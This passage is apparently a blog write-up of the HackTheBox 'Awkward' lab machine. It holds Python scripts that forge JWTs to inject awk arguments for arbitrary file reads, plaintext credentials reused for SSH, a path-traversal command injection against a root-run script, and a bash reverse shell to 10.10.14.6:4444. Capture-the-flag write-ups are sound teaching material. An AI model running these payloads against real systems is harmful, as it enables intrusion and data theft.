  <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="dl">"</span><span class="s2">awk '/</span><span class="dl">"</span> <span class="o">+</span> <span class="nx">user</span> <span class="o">+</span> <span class="dl">"</span><span class="s2">/' /test.csv</span><span class="dl">"</span><span class="p">)</span>
  <span class="nx">exec</span><span class="p">(</span><span class="dl">"</span><span class="s2">awk '/</span><span class="dl">"</span> <span class="o">+</span> <span class="nx">user</span> <span class="o">+</span> <span class="dl">"</span><span class="s2">/' /test.csv</span><span class="dl">"</span><span class="p">,</span> <span class="p">{</span><span class="na">encoding</span><span class="p">:</span> <span class="dl">'</span><span class="s1">binary</span><span class="dl">'</span><span class="p">,</span> <span class="na">maxBuffer</span><span class="p">:</span> <span class="mi">51200000</span><span class="p">},</span> <span class="p">(</span><span class="nx">error</span><span class="p">,</span> <span class="nx">stdout</span><span class="p">,</span> <span class="nx">stderr</span><span class="p">)</span> <span class="o">=&gt;</span> <span class="p">{</span>

    <span class="k">if</span><span class="p">(</span><span class="nx">stdout</span><span class="p">)</span> <span class="p">{</span>
      <span class="k">return</span> <span class="nx">res</span><span class="p">.</span><span class="nx">status</span><span class="p">(</span><span class="mi">200</span><span class="p">).</span><span class="nx">send</span><span class="p">(</span><span class="k">new</span> <span class="nx">Buffer</span><span class="p">(</span><span class="nx">stdout</span><span class="p">,</span> <span class="dl">'</span><span class="s1">binary</span><span class="dl">'</span><span class="p">));</span>
    <span class="p">}</span>

    <span class="k">if</span> <span class="p">(</span><span class="nx">error</span><span class="p">)</span> <span class="p">{</span>
      <span class="k">return</span> <span class="nx">res</span><span class="p">.</span><span class="nx">status</span><span class="p">(</span><span class="mi">500</span><span class="p">).</span><span class="nx">send</span><span class="p">(</span><span class="dl">"</span><span class="s2">Failed to retrieve leave requests</span><span class="dl">"</span><span class="p">)</span>
    <span class="p">}</span>
    <span class="k">if</span> <span class="p">(</span><span class="nx">stderr</span><span class="p">)</span> <span class="p">{</span>
      <span class="k">return</span> <span class="nx">res</span><span class="p">.</span><span class="nx">status</span><span class="p">(</span><span class="mi">500</span><span class="p">).</span><span class="nx">send</span><span class="p">(</span><span class="dl">"</span><span class="s2">Failed to retrieve leave requests</span><span class="dl">"</span><span class="p">)</span>
    <span class="p">}</span>
  <span class="p">})</span>
<span class="p">})</span>

<span class="nx">app</span><span class="p">.</span><span class="nx">listen</span><span class="p">(</span><span class="nx">port</span><span class="p">,</span> <span class="p">()</span> <span class="o">=&gt;</span> <span class="p">{</span>
  <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="s2">`Example app listening on port </span><span class="p">${</span><span class="nx">port</span><span class="p">}</span><span class="s2">`</span><span class="p">)</span>
<span class="p">})</span>
</pre></table></code></div></div><p>And exploit script. (Target needs to be modified accordingly, same as payload)</p><div class="language-python highlighter-rouge"><div class="code-header"> <span label-text="Python"><i class="fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
</pre><td class="rouge-code"><pre><span class="kn">import</span> <span class="nn">sys</span>
<span class="kn">import</span> <span class="nn">requests</span>
<span class="kn">import</span> <span class="nn">jwt</span>

<span class="k">def</span> <span class="nf">jwt_inject_command</span><span class="p">(</span><span class="n">target</span><span class="p">,</span><span class="n">payload</span><span class="p">,</span><span class="n">secret</span><span class="p">):</span>

	<span class="c1">#encoded_jwt = jwt.encode({secret})
</span>	<span class="n">encoded_jwt</span> <span class="o">=</span> <span class="n">jwt</span><span class="p">.</span><span class="n">encode</span><span class="p">({</span><span class="s">'username'</span><span class="p">:</span> <span class="n">payload</span><span class="p">},</span> <span class="n">secret</span><span class="p">,</span> <span class="n">algorithm</span><span class="o">=</span><span class="s">'HS256'</span><span class="p">)</span>
	<span class="k">print</span><span class="p">(</span><span class="s">"Token:"</span> <span class="o">+</span> <span class="n">encoded_jwt</span><span class="p">)</span>
	<span class="n">cookies</span><span class="o">=</span><span class="p">{</span>
		<span class="s">'token'</span><span class="p">:</span><span class="n">encoded_jwt</span>
	<span class="p">}</span>
	<span class="n">r</span> <span class="o">=</span> <span class="n">requests</span><span class="p">.</span><span class="n">get</span><span class="p">(</span><span class="n">target</span><span class="p">,</span><span class="n">cookies</span><span class="o">=</span><span class="n">cookies</span><span class="p">)</span>
	<span class="k">return</span> <span class="n">r</span>

<span class="k">def</span> <span class="nf">main</span><span class="p">():</span>
	<span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">)</span><span class="o">!=</span><span class="mi">1</span><span class="p">:</span>
		<span class="k">print</span><span class="p">(</span><span class="s">"Usage: SCRIPT URL PAYLOAD"</span><span class="p">)</span>
		<span class="n">sys</span><span class="p">.</span><span class="nb">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
	<span class="c1">#target = sys.argv[1]
</span>	<span class="c1">#payload = sys.argv[2]
</span>	<span class="c1">#target = 'http://hat-valley.htb/api/all-leave'
</span>	<span class="n">target</span><span class="o">=</span> <span class="s">'http://localhost:3000/api/all-leave'</span>

	<span class="c1"># Arbitrary read
</span>	<span class="n">payload</span> <span class="o">=</span> <span class="s">"/' /etc/hostname '/"</span>
	<span class="n">secret</span><span class="o">=</span><span class="s">"123beany123"</span>

	<span class="n">out</span> <span class="o">=</span> <span class="n">jwt_inject_command</span><span class="p">(</span><span class="n">target</span><span class="p">,</span><span class="n">payload</span><span class="p">,</span><span class="n">secret</span><span class="p">)</span>
	<span class="k">print</span><span class="p">(</span><span class="n">out</span><span class="p">.</span><span class="n">text</span><span class="p">)</span>

<span class="k">if</span> <span class="n">__name__</span> <span class="o">==</span> <span class="s">'__main__'</span><span class="p">:</span>
	<span class="n">main</span><span class="p">()</span>
</pre></table></code></div></div><p><img data-src="/assets/images/7ea35f398e39abd6398fde3263db91f3bbf613ad95ece8a73682dfcde05de978.png" alt="picture 18" data-proofer-ignore></p><p>Before automating anything, i’ll just be trying to leak some useful data, simply by exchanging the path above. E.g., <code class="language-plaintext highlighter-rouge">/var/www/hat-valley.htb/server/server.js</code> returns with the source code and SQL Credentials.</p><p><img data-src="/assets/images/1f7c3b5317fc94cc1ef0981ec82cbb58a45c4e9f6225bcd485d91daa4f3dc2d7.png" alt="picture 19" data-proofer-ignore></p><h3 id="automate-ssrflfi-using-python">Automate SSRF+LFI using Python<a href="#automate-ssrflfi-using-python" class="anchor"><i class="fas fa-hashtag"></i></a></h3></h3><div class="language-python highlighter-rouge"><div class="code-header"> <span label-text="Python"><i class="fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
</pre><td class="rouge-code"><pre><span class="kn">import</span> <span class="nn">sys</span>
<span class="kn">import</span> <span class="nn">requests</span>
<span class="kn">import</span> <span class="nn">jwt</span>

<span class="k">def</span> <span class="nf">jwt_inject_command</span><span class="p">(</span><span class="n">target</span><span class="p">,</span><span class="n">payload</span><span class="p">,</span><span class="n">secret</span><span class="p">):</span>

	<span class="c1">#encoded_jwt = jwt.encode({secret})
</span>	<span class="n">encoded_jwt</span> <span class="o">=</span> <span class="n">jwt</span><span class="p">.</span><span class="n">encode</span><span class="p">({</span><span class="s">'username'</span><span class="p">:</span> <span class="n">payload</span><span class="p">},</span> <span class="n">secret</span><span class="p">,</span> <span class="n">algorithm</span><span class="o">=</span><span class="s">'HS256'</span><span class="p">)</span>
	<span class="c1">#print("Token:" + encoded_jwt)
</span>	<span class="n">cookies</span><span class="o">=</span><span class="p">{</span>
		<span class="s">'token'</span><span class="p">:</span><span class="n">encoded_jwt</span>
	<span class="p">}</span>
	<span class="n">r</span> <span class="o">=</span> <span class="n">requests</span><span class="p">.</span><span class="n">get</span><span class="p">(</span><span class="n">target</span><span class="p">,</span><span class="n">cookies</span><span class="o">=</span><span class="n">cookies</span><span class="p">)</span>
	<span class="k">return</span> <span class="n">r</span>

<span class="k">def</span> <span class="nf">main</span><span class="p">():</span>
	<span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">)</span><span class="o">!=</span><span class="mi">1</span><span class="p">:</span>
		<span class="k">print</span><span class="p">(</span><span class="s">"Usage: SCRIPT URL PAYLOAD"</span><span class="p">)</span>
		<span class="n">sys</span><span class="p">.</span><span class="nb">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
	<span class="c1">#target = sys.argv[1]
</span>	<span class="c1">#payload = sys.argv[2]
</span>	<span class="n">target</span> <span class="o">=</span> <span class="s">'http://hat-valley.htb/api/all-leave'</span>
	<span class="n">secret</span><span class="o">=</span><span class="s">"123beany123"</span>
	<span class="c1">#target= 'http://localhost:3000/api/all-leave'
</span>	
	<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">100</span><span class="p">,</span><span class="mi">1000</span><span class="p">):</span>
		<span class="c1"># Arbitrary read
</span>		<span class="n">payload</span> <span class="o">=</span> <span class="s">"/' /proc/{}/cmdline '/"</span><span class="p">.</span><span class="nb">format</span><span class="p">(</span><span class="n">i</span><span class="p">)</span>
		<span class="n">out</span> <span class="o">=</span> <span class="n">jwt_inject_command</span><span class="p">(</span><span class="n">target</span><span class="p">,</span><span class="n">payload</span><span class="p">,</span><span class="n">secret</span><span class="p">)</span>
		<span class="k">if</span> <span class="s">"Failed"</span> <span class="ow">not</span> <span class="ow">in</span> <span class="p">(</span><span class="n">out</span><span class="p">.</span><span class="n">text</span><span class="p">):</span>
			<span class="k">print</span><span class="p">(</span><span class="s">"Process found =&gt; {}:"</span><span class="p">.</span><span class="nb">format</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">i</span><span class="p">))</span> <span class="o">+</span> <span class="n">out</span><span class="p">.</span><span class="n">text</span> <span class="p">)</span>

<span class="k">if</span> <span class="n">__name__</span> <span class="o">==</span> <span class="s">'__main__'</span><span class="p">:</span>
	<span class="n">main</span><span class="p">()</span>
</pre></table></code></div></div><p><code class="language-plaintext highlighter-rouge">.bashrc</code> in the <code class="language-plaintext highlighter-rouge">/home/bean</code>, gives us a clue what we should be searching for.</p><p><img data-src="/assets/images/5608adabcd630b3efe6e716666579165e5ccfc00af43bdadd62b0a55551a6a58.png" alt="picture 20" data-proofer-ignore></p><h3 id="finding-backup-script">Finding backup script<a href="#finding-backup-script" class="anchor"><i class="fas fa-hashtag"></i></a></h3></h3><p>Checking the <code class="language-plaintext highlighter-rouge">/home/bean/Documents/backup_home.sh</code> it appears that home is being backed up and saved into <code class="language-plaintext highlighter-rouge">.tar.gz</code>.</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
</pre><td class="rouge-code"><pre><span class="c">#!/bin/bash</span>
<span class="nb">mkdir</span> /home/bean/Documents/backup_tmp
<span class="nb">cd</span> /home/bean
<span class="nb">tar</span> <span class="nt">--exclude</span><span class="o">=</span><span class="s1">'.npm'</span> <span class="nt">--exclude</span><span class="o">=</span><span class="s1">'.cache'</span> <span class="nt">--exclude</span><span class="o">=</span><span class="s1">'.vscode'</span> <span class="nt">-czvf</span> /home/bean/Documents/backup_tmp/bean_backup.tar.gz <span class="nb">.</span>
<span class="nb">date</span> <span class="o">&gt;</span> /home/bean/Documents/backup_tmp/time.txt
<span class="nb">cd</span> /home/bean/Documents/backup_tmp
<span class="nb">tar</span> <span class="nt">-czvf</span> /home/bean/Documents/backup/bean_backup_final.tar.gz <span class="nb">.</span>
<span class="nb">rm</span> <span class="nt">-r</span> /home/bean/Documents/backup_tmp
</pre></table></code></div></div><h2 id="getting-shell-as-bean">Getting shell as Bean<a href="#getting-shell-as-bean" class="anchor"><i class="fas fa-hashtag"></i></a></h2></h2><p>This is the script i’ve used to download the <code class="language-plaintext highlighter-rouge">tar.gz</code></p><div class="language-python highlighter-rouge"><div class="code-header"> <span label-text="Python"><i class="fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
</pre><td class="rouge-code"><pre><span class="kn">import</span> <span class="nn">sys</span>
<span class="kn">import</span> <span class="nn">requests</span>
<span class="kn">import</span> <span class="nn">jwt</span>

<span class="k">def</span> <span class="nf">jwt_inject_command</span><span class="p">(</span><span class="n">target</span><span class="p">,</span><span class="n">payload</span><span class="p">,</span><span class="n">secret</span><span class="p">):</span>

	<span class="c1">#encoded_jwt = jwt.encode({secret})
</span>	<span class="n">encoded_jwt</span> <span class="o">=</span> <span class="n">jwt</span><span class="p">.</span><span class="n">encode</span><span class="p">({</span><span class="s">'username'</span><span class="p">:</span> <span class="n">payload</span><span class="p">},</span> <span class="n">secret</span><span class="p">,</span> <span class="n">algorithm</span><span class="o">=</span><span class="s">'HS256'</span><span class="p">)</span>
	<span class="c1">#print("Token:" + encoded_jwt)
</span>	<span class="n">cookies</span><span class="o">=</span><span class="p">{</span>
		<span class="s">'token'</span><span class="p">:</span><span class="n">encoded_jwt</span>
	<span class="p">}</span>
	<span class="n">proxies</span><span class="o">=</span><span class="p">{</span>
		<span class="s">'http'</span><span class="p">:</span> <span class="s">'http://127.0.0.1:8080'</span>
	<span class="p">}</span>
	<span class="n">r</span> <span class="o">=</span> <span class="n">requests</span><span class="p">.</span><span class="n">get</span><span class="p">(</span><span class="n">target</span><span class="p">,</span><span class="n">cookies</span><span class="o">=</span><span class="n">cookies</span><span class="p">,</span><span class="n">proxies</span><span class="o">=</span><span class="n">proxies</span><span class="p">,</span><span class="n">stream</span><span class="o">=</span><span class="bp">True</span><span class="p">)</span>
	<span class="k">return</span> <span class="n">r</span>

<span class="k">def</span> <span class="nf">main</span><span class="p">():</span>
	<span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">)</span><span class="o">!=</span><span class="mi">1</span><span class="p">:</span>
		<span class="k">print</span><span class="p">(</span><span class="s">"Usage: SCRIPT URL PAYLOAD"</span><span class="p">)</span>
		<span class="n">sys</span><span class="p">.</span><span class="nb">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>

	<span class="n">target</span> <span class="o">=</span> <span class="s">'http://hat-valley.htb/api/all-leave'</span>
	<span class="n">secret</span><span class="o">=</span><span class="s">"123beany123"</span>
	<span class="n">payload</span> <span class="o">=</span> <span class="s">"/' /home/bean/Documents/backup/bean_backup_final.tar.gz '/"</span>
	<span class="n">out</span> <span class="o">=</span> <span class="n">jwt_inject_command</span><span class="p">(</span><span class="n">target</span><span class="p">,</span><span class="n">payload</span><span class="p">,</span><span class="n">secret</span><span class="p">)</span>

	<span class="n">target_path</span> <span class="o">=</span> <span class="s">'bkp.tar.gz'</span>
	
	<span class="k">if</span> <span class="n">out</span><span class="p">.</span><span class="n">status_code</span> <span class="o">==</span> <span class="mi">200</span><span class="p">:</span>
		<span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="n">target_path</span><span class="p">,</span> <span class="s">'wb'</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>
			<span class="n">f</span><span class="p">.</span><span class="n">write</span><span class="p">(</span><span class="n">out</span><span class="p">.</span><span class="n">raw</span><span class="p">.</span><span class="n">read</span><span class="p">())</span>

<span class="k">if</span> <span class="n">__name__</span> <span class="o">==</span> <span class="s">'__main__'</span><span class="p">:</span>
	<span class="n">main</span><span class="p">()</span>

</pre></table></code></div></div><p>We need to unpack the <code class="language-plaintext highlighter-rouge">tar.gz</code> two times, so output should be in the end as seen below.</p><p><img data-src="/assets/images/23270986ddadb9f6374169bc45e80854537e823efd31e9705b1cf19de5a53f98.png" alt="picture 21" data-proofer-ignore></p><p>Search for <code class="language-plaintext highlighter-rouge">bean</code> using grep</p><p><img data-src="/assets/images/17c9bac385136af73690525da377e9753d26b4a4c6792597721c14aefd343fb2.png" alt="picture 22" data-proofer-ignore></p><p>There we have a file <code class="language-plaintext highlighter-rouge">./.config/xpad/content-DS1ZS1</code>.</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
</pre><td class="rouge-code"><pre>┌──(luka㉿yokai)-[~/htb/boxes/awkward/bkp]
└─$ cat ./.config/xpad/content-DS1ZS1
TO DO:
- Get real hat prices / stock from Christine
- Implement more secure hashing mechanism for HR system
- Setup better confirmation message when adding item to cart
- Add support for item quantity &gt; 1
- Implement checkout system

boldHR SYSTEM/bold
bean.hill
014mrbeanrules!#P

https://www.slac.stanford.edu/slac/www/resource/how-to-use/cgi-rexx/cgi-esc.html

boldMAKE SURE TO USE THIS EVERYWHERE ^^^/bold
</pre></table></code></div></div><p>Credentials above work for SSH!</p><h1 id="privilege-escalation-from-bean-to-root">Privilege Escalation from bean to root</h1><p>Privilege Escalation is not straightforward at all. We have 2 Users on the box, one is <code class="language-plaintext highlighter-rouge">bean</code> and other one is <code class="language-plaintext highlighter-rouge">christine</code>. I wasn’t really able to find much files/directories owned by <code class="language-plaintext highlighter-rouge">christine</code> and no processes.</p><h2 id="pspy">PSPY<a href="#pspy" class="anchor"><i class="fas fa-hashtag"></i></a></h2></h2><p>This looked interesting when running <code class="language-plaintext highlighter-rouge">pspy64s</code>:</p><p><img data-src="/assets/images/78a62b3afeef63f45ec31fae142f3e0e97318cabd4cdbcd3837349251736cb99.png" alt="picture 23" data-proofer-ignore></p><p>It runs as root and it triggers when <code class="language-plaintext highlighter-rouge">/var/www/private/leave_requests.csv</code> changes, which we can control through HR panel!</p><h2 id="storehat-valleyhtb">Store.hat-valley.htb<a href="#storehat-valleyhtb" class="anchor"><i class="fas fa-hashtag"></i></a></h2></h2><p>We can login onto <code class="language-plaintext highlighter-rouge">store.hat-valley.htb</code> using <code class="language-plaintext highlighter-rouge">admin:014mrbeanrules!#P</code>, which is same password that <code class="language-plaintext highlighter-rouge">bean</code> has for SSH access on the <code class="language-plaintext highlighter-rouge">Awkward</code> box.</p><p>We can write to two directories: <img data-src="/assets/images/426760ba9f059fec19cc39fed8934f25c6d2d030171e52ca9780c3193b15253f.png" alt="picture 28" data-proofer-ignore></p><p>PHP files will not execute:</p><p><img data-src="/assets/images/50bc68f08e42ff185e1c079d12b24df03f16f22c98017af11720549611c945ad.png" alt="picture 30" data-proofer-ignore></p><p>If we check the script on the backend - e.g., the <code class="language-plaintext highlighter-rouge">cart_actions.php</code> we would notice that user input goes through <code class="language-plaintext highlighter-rouge">system</code> call 3 times.</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
</pre><td class="rouge-code"><pre>bean@awkward:/var/www/store$ grep -rnw . -e "system("
./cart_actions.php:38:            system("echo '***Hat Valley Cart***' &gt; {$STORE_HOME}cart/{$user_id}");
./cart_actions.php:40:        system("head -2 {$STORE_HOME}product-details/{$item_id}.txt | tail -1 &gt;&gt; {$STORE_HOME}cart/{$user_id}");
./cart_actions.php:69:        system("sed -i '/item_id={$item_id}/d' {$STORE_HOME}cart/{$user_id}");
</pre></table></code></div></div><p>The one that we can exploit and make something out of it is the <code class="language-plaintext highlighter-rouge">head -2 .... | tail -1</code> invocation, by rewriting single line of our chosing. This is possible because we control <code class="language-plaintext highlighter-rouge">item_id</code> AND the <code class="language-plaintext highlighter-rouge">user_id</code>.</p><p><img data-src="/assets/images/15af7ffeabd08b18c212cf2424e6b59f6c6883d99cdde7f71102682d37551fc0.png" alt="picture 24" data-proofer-ignore></p><p>The way we control those values is a little bit strange, but application reads those from files into which we can write, to <code class="language-plaintext highlighter-rouge">cart</code> and <code class="language-plaintext highlighter-rouge">product-details</code> as seen few screenshots above.</p><p><img data-src="/assets/images/238d691afe7dcd7890aadc548d2397f07cfd3bd6c664ce63eab1c5e6389802cb.png" alt="picture 31" data-proofer-ignore></p><p>Blacklist does not stop us from path traversing and adding slashes, dots, dashes. For example like this:</p><p><img data-src="/assets/images/4def1beeb6fab9e207992149695493f86a8503c56d0267cf3a342c4fd87c9610.png" alt="picture 26" data-proofer-ignore></p><p>We can notice that we’ve successfully written into a file. (mind the <code class="language-plaintext highlighter-rouge">head</code> and <code class="language-plaintext highlighter-rouge">tail</code>, we just append and not rewrite everything).</p><p>Observing the pspy64s output, this is the command that fires in the background.</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>sh -c head -2 /var/www/store/product-details/4.txt | tail -1 &gt;&gt; /var/www/store/cart/../../../../../var/www/private/leave_requests.csv
</pre></table></code></div></div><p>We need SSRF again to check the <code class="language-plaintext highlighter-rouge">/var/www/private/leave_results.csv</code></p><p><img data-src="/assets/images/5d0c7dcd397825f37fddb803537b13b00e41d2992de9842a48177ad53772e437.png" alt="picture 25" data-proofer-ignore></p><p>Script use that will be invoked after <code class="language-plaintext highlighter-rouge">inotifywait</code> fires on modification.</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre><td class="rouge-code"><pre>bean@awkward:/tmp$ cat rev.sh 
#!/bin/bash
bash -i &gt;&amp; /dev/tcp/10.10.14.6/4444 0&gt;&amp;1
</pre></table></code></div></div><p>Root shell has opened <img data-src="/assets/images/7cbce73ada57fd864e588849451e9e0d06b4871df0b1a9b57c748c9498db3136.png" alt="picture 29" data-proofer-ignore></p></div><div class="post-tail-wrapper text-muted"><div class="post-meta mb-3"> <i class="far fa-folder-open fa-fw mr-1"></i> <a href='/categories/hackthebox/'>HackTheBox</a>, <a href='/categories/linux/'>Linux</a></div><div class="post-tags"> <i class="fa fa-tags fa-fw mr-1"></i> <a href="/tags/jwt/" class="post-tag no-text-decoration" >JWT</a> <a href="/tags/password-reuse/" class="post-tag no-text-decoration" >Password Reuse</a> <a href="/tags/password-cracking/" class="post-tag no-text-decoration" >Password Cracking</a> <a href="/tags/cookie-manipulation/" class="post-tag no-text-decoration" >Cookie Manipulation</a> <a href="/tags/dictionary-attack/" class="post-tag no-text-decoration" >Dictionary attack</a> <a href="/tags/api-abuse/" class="post-tag no-text-decoration" >API Abuse</a> <a href="/tags/authentication-bypass/" class="post-tag no-text-decoration" >Authentication bypass</a> <a href="/tags/local-file-inclusion/" class="post-tag no-text-decoration" >Local File Inclusion</a> <a href="/tags/arbitrary-file-read/" class="post-tag no-text-decoration" >Arbitrary File Read</a> <a href="/tags/clear-text-credentials/" class="post-tag no-text-decoration" >Clear Text Credentials</a> <a href="/tags/os-command-injection/" class="post-tag no-text-decoration" >OS Command Injection</a> <a href="/tags/server-side-request-forgery-ssrf/" class="post-tag no-text-decoration" >Server Side Request Forgery (SSRF)</a> <a href="/tags/misconfiguration/" class="post-tag no-text-decoration" >Misconfiguration</a></div><div class="post-tail-bottom d-flex justify-content-between align-items-center mt-3 pt-5 pb-2"><div class="license-wrapper"> This post is licensed under <a href="https://creativecommons.org/licenses/by/4.0/"> CC BY 4.0 </a> by the author.</div><div class="share-wrapper"> <span class="share-label text-muted mr-1">Share</span> <span class="share-icons"> <a href="https://twitter.com/intent/tweet?text=(HTB) - Awkward - CyberSec-Research.Space&url=https://an9k0r.github.io/posts/awkward/" data-toggle="tooltip" data-placement="top" title="Twitter" target="_blank" rel="noopener" aria-label="Twitter"> <i class="fa-fw fab fa-twitter"></i> </a> <a href="https://www.facebook.com/sharer/sharer.php?title=(HTB) - Awkward - CyberSec-Research.Space&u=https://an9k0r.github.io/posts/awkward/" data-toggle="tooltip" data-placement="top" title="Facebook" target="_blank" rel="noopener" aria-label="Facebook"> <i class="fa-fw fab fa-facebook-square"></i> </a> <a href="https://telegram.me/share?text=(HTB) - Awkward - CyberSec-Research.Space&url=https://an9k0r.github.io/posts/awkward/" data-toggle="tooltip" data-placement="top" title="Telegram" target="_blank" rel="noopener" aria-label="Telegram"> <i class="fa-fw fab fa-telegram"></i> </a> <i id="copy-link" class="fa-fw fas fa-link small" data-toggle="tooltip" data-placement="top" title="Copy link" title-succeed="Link copied successfully!"> </i> </span></div></div></div></div></div><div id="panel-wrapper" class="col-xl-3 pl-2 text-muted"><div class="access"><div id="access-lastmod" class="post"><div class="panel-heading">Recently Updated</div><ul class="post-content pl-0 pb-1 ml-1 mt-2"><li><a href="/posts/insecure_deserialization/">(Portswigger/WebAcademy) - Insecure Deserialization vulnerabilities</a><li><a href="/posts/ssti/">(Portswigger/WebAcademy) - Server-Side Template Injection vulnerabilities</a><li><a href="/posts/stored_XSS/">(Portswigger/WebAcademy) - Stored Cross-Site Scripting (XSS)</a><li><a href="/posts/Blind_SQL_Injection/">Blind SQL Injection</a><li><a href="/posts/OS_Command_Injection/">OS Command Injection</a></ul></div><div id="access-tags"><div class="panel-heading">Trending Tags</div><div class="d-flex flex-wrap mt-3 mb-1 mr-3"> <a class="post-tag" href="/tags/notes/">Notes</a> <a class="post-tag" href="/tags/portswigger/">Portswigger</a> <a class="post-tag" href="/tags/web-application/">Web Application</a> <a class="post-tag" href="/tags/linux/">Linux</a> <a class="post-tag" href="/tags/clear-text-credentials/">Clear Text Credentials</a> <a class="post-tag" href="/tags/password-reuse/">Password Reuse</a> <a class="post-tag" href="/tags/windows/">Windows</a> <a class="post-tag" href="/tags/deserialization/">Deserialization</a> <a class="post-tag" href="/tags/misconfiguration/">Misconfiguration</a> <a class="post-tag" href="/tags/password-cracking/">Password Cracking</a></div></div></div><script src="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.js"></script><div id="toc-wrapper" class="pl-0 pr-4 mb-5"><div class="panel-heading pl-3 pt-2 mb-2">Contents</div><nav id="toc" data-toggle="toc"></nav></div></div></div><div class="row"><div class="col-12 col-lg-11 col-xl-8"><div id="tail-wrapper" class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"><div id="related-posts" class="mt-5 mb-2 mb-sm-4"><h3 class="pt-2 mt-1 mb-4 ml-1" data-toc-skip>Further Reading</h3><div class="card-deck mb-4"><div class="card"> <a href="/posts/Bucket/"><div class="card-body"> <em class="timeago small" date="2022-09-15 11:33:00 +0200" >Sep 15, 2022</em><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Bucket</h3><div class="text-muted small"><p> Bucket is medium rated linux box, which is mostly about exploiting common bucket miscofigurations. Bucket is based on AWS technology(DynamoDB,S3) ENUMERATION NMAP Let’s start NMAP: Nmap scan repo...</p></div></div></a></div><div class="card"> <a href="/posts/Academy/"><div class="card-body"> <em class="timeago small" date="2022-09-22 11:33:00 +0200" >Sep 22, 2022</em><h3 class="pt-0 mt-1 mb-3" data-toc-skip>(HTB) - Academy</h3><div class="text-muted small"><p> Academy is a new product from hack the box and this box gives a preview into it. This box however unlike the real HTB Academy has been made vulnerable ENUMERATION NMAP Let’s start NMAP 22/tcp open...</p></div></div></a></div><div class="card"> <a href="/posts/StreamIO/"><div class="card-body"> <em class="timeago small" date="2022-09-17 11:33:00 +0200" >Sep 17, 2022</em><h3 class="pt-0 mt-1 mb-3" data-toc-skip>(HTB) - StreamIO</h3><div class="text-muted small"><p> StreamIO is a medium Windows box. It’s all about enumeration at the start, finding SQL injection, Local and Remote File Inclusion. We have to keep track of passwords at all times. Last privilege Es...</p></div></div></a></div></div></div><div class="post-navigation d-flex justify-content-between"> <a href="/posts/photobomb/" class="btn btn-outline-primary" prompt="Older"><p>(HTB) - Photobomb</p></a> <a href="/posts/ambassador/" class="btn btn-outline-primary" prompt="Newer"><p>(HTB) - Ambassador</p></a></div></div></div></div><footer class="d-flex w-100 justify-content-center"><div class="d-flex justify-content-between align-items-center text-muted"><div class="footer-left"><p class="mb-0"> © 2023 <a href="https://twitter.com/cybersec_space">eng4ge</a>. <span data-toggle="tooltip" data-placement="top" title="Except where otherwise noted, the blog posts on this site are licensed under the Creative Commons Attribution 4.0 International (CC BY 4.0) License by the author.">Some rights reserved.</span></p></div><div class="footer-right"><p class="mb-0"> Powered by <a href="https://jekyllrb.com" target="_blank" rel="noopener">Jekyll</a> with 